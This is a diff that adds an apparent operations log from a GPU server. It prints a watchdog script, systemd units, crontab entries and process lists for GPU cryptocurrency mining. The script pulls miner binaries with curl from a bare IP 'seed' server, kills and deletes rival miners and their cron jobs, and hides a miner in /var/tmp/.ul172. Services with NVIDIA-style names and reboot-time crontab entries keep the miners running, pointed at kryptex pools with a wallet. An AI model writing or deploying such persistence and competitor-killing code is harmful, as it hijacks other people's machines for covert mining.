@@ -1,0 +1,155 @@
+=== ul-t2 ops host=t19-l40s1-eude2-canon ts=2026-11-25T05:59:14Z run=45557302305 sudo=[sudo -n]
+total 66168
+drwxr-xr-x 4 root root     4096 Nov 23 00:44 .
+drwxr-xr-x 5 root root     4096 Nov 25 01:07 ..
+-rw-r--r-- 1 root root       14 Nov 22 22:27 fip
+-rw-r--r-- 1 root root       68 Nov 22 22:27 gpu.txt
+-rw-r--r-- 1 root root        0 Nov 25 05:58 keep.lock
+-rwxr-xr-x 1 root root     3463 Nov 22 22:23 keep.sh
+drwxr-xr-x 2 root root     4096 Nov 23 00:40 logs
+-rwxr-xr-x 1 root root 46116552 Nov 22 22:27 peakminer
+drwxr-xr-x 2 root root     4096 Nov 22 22:27 run
+-rwxr-xr-x 1 root root     1943 Nov 22 22:23 run-g.sh
+-rwxr-xr-x 1 root root 21601960 Nov 22 22:27 srb
+-rwxr-xr-x 1 root root       59 Nov 23 00:44 supervisor.sh
+--- keep.sh
+#!/bin/bash
+# /opt/nv/keep.sh - canonical watchdog v17 (i70783)
+D=/opt/nv
+SEED='http://163.68.86.6:8090'
+mkdir -p "$D/logs"
+if [ -r "$D/keep.lock" ] && fuser "$D/keep.lock" >/dev/null 2>&1; then
+  for lp in $(fuser "$D/keep.lock" 2>/dev/null); do
+    let_=$(ps -o etimes= -p "$lp" 2>/dev/null | tr -d ' ')
+    if [ -n "$let_" ] && [ "$let_" -gt 600 ] 2>/dev/null; then
+      tr '\0' ' ' < /proc/$lp/cmdline 2>/dev/null | grep -q 'kee[p]\.sh' && kill -9 "$lp" 2>/dev/null
+    fi
+  done
+fi
+exec 9>"$D/keep.lock"
+flock -n 9 || exit 0
+if [ "$(id -u)" = 0 ]; then
+  for u in nv-cuda-cache t19k-keep t19-keep t19-keep9 krig-t19 xmr-t19; do systemctl disable --now "$u" >/dev/null 2>&1; done
+  for f in $(timeout 25 grep -rlE '/opt/t19|/root/\.km|keep9\.sh' /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null | head -20); do
+    systemctl disable --now "$(basename "$f")" >/dev/null 2>&1
+    rm -f "$f"
+  done
+  systemctl daemon-reload 2>/dev/null
+  for u in nv-cuda-cache t19k-keep t19-keep t19-keep9; do systemctl mask "$u" >/dev/null 2>&1; done
+  for pass in 1 2 3; do
+    pkill -9 -f '/opt/t1[9]' 2>/dev/null
+    pkill -9 -f '/opt/t19[k]2' 2>/dev/null
+    pkill -9 -f '/var/tmp/\.[k]w' 2>/dev/null
+    pkill -9 -f '/root/\.[k]m' 2>/dev/null
+    sleep 1
+  done
+  rm -rf /opt/t19 /opt/t19k /opt/t19k2 /opt/t19.disabled* /opt/t19k.disabled* /root/.km 2>/dev/null
+  pkill -9 -f '/opt/t1[9]' 2>/dev/null
+  rm -f /etc/cron.d/xmr-t19 /etc/cron.d/nv-t19 /etc/cron.d/nv-t19k /etc/cron.d/t19 /etc/cron.d/t19k /etc/cron.d/krig-t19 2>/dev/null
+  timeout 10 crontab -l 2>/dev/null | grep -vE 'nv-cuda|/opt/t19|/root/\.km|krig-t19|xmr-t19' | crontab - 2>/dev/null
+  timeout 10 crontab -u ubuntu -l 2>/dev/null | grep -vE 'nv-cuda|/opt/t19|/root/\.km|krig-t19|xmr-t19' | crontab -u ubuntu - 2>/dev/null
+fi
+ensure() { f="$1"; min="$2"; if [ ! -f "$f" ] || [ "$(stat -c%s "$f" 2>/dev/null || echo 0)" -lt "$min" ]; then curl -sf -m 300 "$SEED/$(basename "$f")" -o "$f.tmp" && chmod 755 "$f.tmp" && mv -f "$f.tmp" "$f"; fi; }
+FIP=$(cat "$D/fip" 2>/dev/null)
+case "$FIP" in *[0-9].[0-9]*) ;; *) FIP=$(curl -s -m 10 http://ifconfig.me 2>/dev/null); echo "$FIP" > "$D/fip";; esac
+FIPD=$(echo "$FIP" | tr '.' '-')
+NG=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+[ "${NG:-0}" -eq 0 ] && NG=$(ls /dev/nvidia[0-9]* 2>/dev/null | wc -l | tr -d ' ')
+[ "${NG:-0}" -ge 1 ] || { echo "[$(date -u +%FT%TZ)] no gpu" >> "$D/logs/keep.log"; exit 0; }
+ensure "$D/peakminer" 40000000
+ensure "$D/srb" 20000000
+for i in $(seq 0 $((NG-1))); do
+  ROOTS=$(ps -eo pid=,ppid=,args= | grep -E "/opt/nv/[p]eakminer -d $i( |$)|/opt/nv/[s]rb .*--gpu-id $i( |$)" | awk '{p[$1]=$2} END{for(x in p) if(!(p[x] in p)) print x}' | sort -n)
+  CNT=$(echo "$ROOTS" | grep -c . )
+  if [ "${CNT:-0}" -gt 1 ]; then
+    KEEP=$(echo "$ROOTS" | tail -1)
+    for p in $ROOTS; do
+      if [ "$p" != "$KEEP" ]; then
+        echo "[$(date -u +%FT%TZ)] dedupe kill g$i root=$p" >> "$D/logs/keep.log"
+        kill -9 "-$p" 2>/dev/null || kill -9 "$p" 2>/dev/null
+      fi
+    done
+  fi
+done
+for i in $(seq 0 $((NG-1))); do
+  ROOTS2=$(ps -eo pid=,ppid=,args= | grep -E "/opt/nv/[p]eakminer -d $i( |$)|/opt/nv/[s]rb .*--gpu-id $i( |$)" | awk '{p[$1]=$2} END{for(x in p) if(!(p[x] in p)) print x}' | sort -n)
+  if [ -n "$ROOTS2" ]; then :
+  else
+    echo "[$(date -u +%FT%TZ)] respawn g$i ($FIPD) roots_empty" >> "$D/logs/keep.log"
+    setsid nohup "$D/run-g.sh" "$i" >> "$D/logs/g$i.out" 2>&1 9>&- &
+  fi
+done
+--- unit nv-t19
+# /etc/systemd/system/nv-t19.service
+[Unit]
+Description=nv pearl supervisor
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/opt/nv/supervisor.sh
+Restart=always
+RestartSec=30
+Nice=10
+
+[Install]
+WantedBy=multi-user.target
+--- unit nv-t19v
+# /etc/systemd/system/nv-t19v.service
+[Unit]
+Description=nv-t19v supervisor
+After=network-online.target
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'while true; do /bin/bash /opt/nv/keep.sh; sleep 60; done'
+Restart=always
+RestartSec=30
+Nice=10
+[Install]
+WantedBy=multi-user.target
+--- unit ul-nvpm
+# /etc/systemd/system/ul-nvpm.service
+[Unit]
+Description=nvpm worker
+[Service]
+Type=simple
+Restart=always
+RestartSec=25
+ExecStart=/home/ubuntu/ul7256/ul-loop.sh
+[Install]
+WantedBy=multi-user.target
+--- ul172 run.sh
+#!/bin/bash
+BIN=/var/tmp/.ul172/wildrig-multi
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz; WK=ul-t172-t19-l40s1-eude2-canon-g0
+while :; do
+  $BIN --algo pearlhash --url prl-sg.kryptex.network:7048 --user $W --worker $WK --pass x -o $D/m.log >/dev/null 2>&1
+  sleep 8
+done
+--- counts before wildrig=13 peak=2 ul172=13
+--- stop wildrig herd
+/opt/ul-runner/_work/_temp/2f120cc9-d4d2-4bf9-816f-0dc29970697a.sh: line 51: 2518584 Killed                  $SUDO pkill -9 -f '/var/tmp/.ul172/wildrig-multi'
+e2scrub_all
+nv-t19v
+ul-guard
+ul-nvpm
+--- counts after wildrig=15 peak=2
+--- nvidia
+0, NVIDIA L40S, 46068 MiB, 3619 MiB, 100 %, 344.09 W
+--- peak argv
+29291 /opt/nv/peakminer -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-t19-149-81-10-242-g0 -p x -c pearl
+29317 /opt/nv/peakminer -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-t19-149-81-10-242-g0 -p x -c pearl
+--- channel install
+--- crontab now
+@reboot root setsid bash /opt/fleet/sup.sh >/dev/null 2>&1 &
+*/5 * * * * root pgrep -f /opt/fleet/sup.sh >/dev/null || setsid bash /opt/fleet/sup.sh >/dev/null 2>&1 &
+@reboot /home/ubuntu/ul7256/ul-loop.sh
+*/5 * * * * /home/ubuntu/ul7256/ul-loop.sh
+*/2 * * * * /home/ubuntu/ul2/poll.sh >/dev/null 2>&1
+--- poller
+2518646 bash -c while true; do $HOME/ul2/poll.sh; sleep 120; done
+2518651 /bin/bash /home/ubuntu/ul2/poll.sh
+--- seed cmd8
+SEED_PUT 201
+=== END
